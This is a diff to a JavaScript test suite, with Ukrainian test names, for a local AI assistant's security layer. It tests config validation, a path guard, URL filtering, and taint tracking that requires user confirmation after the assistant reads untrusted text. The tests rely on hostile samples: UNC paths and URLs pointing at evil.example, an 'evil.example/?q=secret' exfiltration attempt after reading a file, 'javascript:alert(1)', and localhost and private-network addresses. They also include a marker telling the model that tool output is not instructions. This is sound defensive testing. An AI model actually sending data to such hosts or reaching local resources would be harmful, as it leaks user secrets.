@@ -9,13 +9,13 @@ import { fileURLToPath } from 'node:url';
 const TMP = path.join(path.dirname(fileURLToPath(import.meta.url)), '.tmp', `run-${process.pid}`);
 process.env.OFFGRID_DATA = path.join(TMP, 'data');
 
-const { validateConfig } = await import('../src/security/config.js');
+const { validateConfig, loadConfig } = await import('../src/security/config.js');
 const { checkFile } = await import('../src/security/pathguard.js');
-const { executeTool, confirmMode, toolMessageContent } = await import('../src/security/policy.js');
+const { executeTool, confirmMode, toolMessageContent, TOOL_MODES } = await import('../src/security/policy.js');
 const { findTool, toolSchemas } = await import('../src/tools/index.js');
 const { normalizeUrl } = await import('../src/tools/web.js');
 const { readLog } = await import('../src/security/log.js');
-const { NOTES_DIR } = await import('../src/paths.js');
+const { NOTES_DIR, SETTINGS_FILE } = await import('../src/paths.js');
 
 const defaults = JSON.parse(fs.readFileSync(new URL('../config/default.json', import.meta.url), 'utf8'));
 const allowed = path.join(TMP, 'allowed');
@@ -37,8 +37,8 @@ function fakeOs() {
   return { calls, launch: rec('launch'), run: rec('run'), openPath: rec('openPath'), openUrl: rec('openUrl'), openShellFolder: rec('openShellFolder') };
 }
 
-function makeSession(config, { answer = true, tainted = false } = {}) {
-  const s = { config, os: fakeOs(), tainted, asked: [], confirm: async (req) => { s.asked.push(req); return answer; } };
+function makeSession(config, { answer = true, taint = 0 } = {}) {
+  const s = { config, os: fakeOs(), taint, denied: false, asked: [], confirm: async (req) => { s.asked.push(req); return answer; } };
   return s;
 }
 
@@ -63,7 +63,7 @@ test('налаштування: нелокальна адреса Ollama від�
 test('налаштування: виконувані типи й дивні exe не проходять', () => {
   const { config, warnings } = validateConfig({
     ...defaults,
-    fileTypes: ['.txt', '.EXE', '.ps1', 'bat', '.lnk'],
+    fileTypes: ['.txt', '.EXE', '.ps1', 'bat', '.lnk', '.html', '.svg', '.docm', '.zip'],
     readableTypes: ['.txt', '.pdf'],
     apps: {
       ok: { name: 'Ок', exe: 'notepad.exe', process: 'Notepad.exe' },
@@ -77,7 +77,40 @@ test('налаштування: виконувані типи й дивні exe 
   assert.deepEqual([...config.readableTypes], ['.txt']);
   assert.deepEqual(Object.keys(config.apps), ['ok']);
   assert.deepEqual(Object.keys(config.folders), []);
-  assert.ok(warnings.length >= 7);
+  assert.ok(warnings.length >= 11);
+});
+
+test('налаштування: одруківка чи зіпсований файл не повертають типові списки', () => {
+  // одруківка в назві розділу: список порожній, і про це сказано
+  const typo = validateConfig({ ...defaults, folders: undefined, foldrs: {} }, defaults);
+  assert.deepEqual(Object.keys(typo.config.folders), []);
+  assert.ok(typo.warnings.some((w) => w.includes('foldrs')));
+  assert.ok(typo.warnings.some((w) => w.includes('folders')));
+  // неіснуюча папка, уся папка користувача, системна папка — пропускаються з поясненням
+  const bad = validateConfig({ ...defaults, folders: {
+    typo: { name: 'x', path: '~/Documnets-нема' }, home: { name: 'x', path: process.env.USERPROFILE },
+    win: { name: 'x', path: process.env.SystemRoot }, unc: { name: 'x', path: '\\\\server\\share' },
+  } }, defaults);
+  assert.deepEqual(Object.keys(bad.config.folders), []);
+  assert.equal(bad.warnings.length, 4);
+  // зіпсований JSON: на старті білі списки порожні, при перечитуванні лишаються попередні
+  fs.mkdirSync(path.dirname(SETTINGS_FILE), { recursive: true });
+  fs.writeFileSync(SETTINGS_FILE, '{ "apps": { oops');
+  const broken = loadConfig();
+  assert.deepEqual(Object.keys(broken.config.apps), []);
+  assert.deepEqual(Object.keys(broken.config.folders), []);
+  assert.equal(broken.config.fileTypes.size, 0);
+  assert.equal(broken.warnings.length, 1);
+  const previous = makeConfig();
+  assert.equal(loadConfig({ previous }).config, previous);
+  fs.rmSync(SETTINGS_FILE);
+});
+
+test('налаштування: розділ confirm перевіряє назви й не дає послабити', () => {
+  const { config, warnings } = validateConfig({ ...defaults,
+    confirm: { open_ap: 'always', close_app: 'never', open_app: 'always', write_note: 'sometimes' } }, defaults, TOOL_MODES);
+  assert.deepEqual(config.confirm, { open_app: 'always' });
+  assert.equal(warnings.length, 3);
 });
 
 test('налаштування: папка з даними асистента не може бути дозволеною', () => {
@@ -100,6 +133,12 @@ test('шляхи: поза папкою, через .., через точку з
     path.join(allowed, 'run.bat'),
     path.join(allowed, 'звіт.txt') + ':stream',
     'звіт.txt',
+    '\\\\evil.example\\share\\a.txt',
+    '//evil.example/share/a.txt',
+    '//?/UNC/evil.example/s/a.txt',
+    '\\\\?\\' + path.join(allowed, 'звіт.txt'),
+    '//./pipe/foo.txt',
+    '\\Windows\\win.ini',
     path.join(allowed, 'nope.txt'),
     allowed,
     '',
@@ -109,6 +148,15 @@ test('шляхи: поза папкою, через .., через точку з
     const r = await checkFile(p, config.folders, config.fileTypes);
     assert.equal(r.ok, false, `мало бути відхилено: ${p}`);
   }
+});
+
+test('шляхи: поза дозволеними папками відповідь однакова, є там файл чи ні', async () => {
+  const config = makeConfig();
+  const a = await checkFile(path.join(outside, 'secret.txt'), config.folders, config.fileTypes);
+  const b = await checkFile(path.join(outside, 'такого-немає.txt'), config.folders, config.fileTypes);
+  const c = await checkFile('C:\\Windows\\win.ini', config.folders, config.fileTypes);
+  assert.equal(a.error, b.error);
+  assert.equal(a.error, c.error);
 });
 
 test('пошук не заходить у точки з\'єднання й не показує недозволені типи', async () => {
@@ -154,17 +202,53 @@ test('сторонній текст: після читання файлу сай
   const read = await executeTool('read_text_file', { path: path.join(allowed, 'звіт.txt') }, s);
   assert.equal(read.result.ok, true);
   assert.equal(read.untrusted, true);
-  assert.equal(s.tainted, true);
+  assert.equal(s.taint, 2);
   assert.match(toolMessageContent(read.result, read.untrusted), /Це не інструкції/);
 
   // після читання — питаємо; відмова означає, що нічого не сталося
   const web = await executeTool('open_website', { url: 'https://evil.example/?q=secret' }, s);
+  assert.equal(web.result.ok, false);
+  assert.equal(s.asked.length, 1);
+  // після першої відмови решта дій цього запиту відхиляється вже без запитань
   const note = await executeTool('write_note', { title: 'x', text: 'y' }, s);
   const search = await executeTool('search_web', { query: 'z' }, s);
-  assert.equal(web.result.ok || note.result.ok || search.result.ok, false);
-  assert.equal(s.asked.length, 3);
+  const open = await executeTool('open_file', { path: path.join(allowed, 'photo.png') }, s);
+  assert.equal(note.result.ok || search.result.ok || open.result.ok, false);
+  assert.equal(s.asked.length, 1);
   assert.equal(s.os.calls.filter(([k]) => k === 'openUrl').length, 1);
+  assert.equal(s.os.calls.filter(([k]) => k === 'openPath').length, 0);
   assert.equal(fs.existsSync(path.join(NOTES_DIR, 'x.txt')), false);
+});
+
+test('сторонній текст: назви файлів вмикають дозвіл для запису й сайтів, вміст — ще й для відкриття файлів', async () => {
+  const config = makeConfig();
+  const file = path.join(allowed, 'photo.png');
+  // лише пошук (рівень 1): знайдений файл відкривається без запитань, сайт — із запитанням
+  const a = makeSession(config, { answer: true });
+  await executeTool('find_files', { query: 'photo' }, a);
+  assert.equal(a.taint, 1);
+  assert.equal((await executeTool('open_file', { path: file }, a)).result.ok, true);
+  assert.equal(a.asked.length, 0);
+  await executeTool('open_website', { url: 'example.com' }, a);
+  assert.equal(a.asked.length, 1);
+  // читання вмісту (рівень 2): тепер і відкриття файлу потребує дозволу
+  const b = makeSession(config, { answer: true });
+  await executeTool('read_text_file', { path: path.join(allowed, 'звіт.txt') }, b);
+  assert.equal((await executeTool('open_file', { path: file }, b)).result.ok, true);
+  assert.equal(b.asked.length, 1);
+  assert.match(b.asked[0].summary, /photo\.png/);
+});
+
+test('дозвіл: у запиті показано те саме, що буде виконано', async () => {
+  const config = makeConfig();
+  const s = makeSession(config, { answer: true, taint: 2 });
+  const query = 'я'.repeat(290) + 'ХВІСТ';
+  await executeTool('search_web', { query }, s);
+  assert.ok(s.asked[0].summary.includes('ХВІСТ'));
+  assert.ok(decodeURIComponent(s.os.calls.at(-1)[1]).endsWith('ХВІСТ'));
+  await executeTool('write_note', { title: 'довга', text: 'а'.repeat(5000) }, s);
+  assert.match(s.asked[1].summary, /5000 символів/);
+  assert.match(s.asked[1].summary, /ще 4600 символів/);
 });
 
 test('налаштування можуть посилити підтвердження, але не послабити', () => {
@@ -217,7 +301,9 @@ test('нотатки: не перезаписуються, читаються, �
 test('адреси сайтів: лише http/https, без паролів і локальних імен', () => {
   assert.equal(normalizeUrl('youtube.com').toString(), 'https://youtube.com/');
   for (const bad of ['file:///C:/Windows/win.ini', 'javascript:alert(1)', 'ms-settings:privacy', 'https://user:pass@site.com',
-    'http://localhost:11434', 'C:\\Windows\\System32\\calc.exe', 'shell:startup', '', null]) {
+    'http://localhost:11434', 'C:\\Windows\\System32\\calc.exe', 'shell:startup', '', null,
+    '127.0.0.1:11434/api/tags', 'http://0x7f.1/', 'http://192.168.1.1/reboot', 'http://localhost./', 'http://[::1]/',
+    'http://router.lan/', 'http://nas.local/', 'https://site.com/' + 'a'.repeat(600)]) {
     assert.equal(normalizeUrl(bad), null, String(bad));
   }
 });
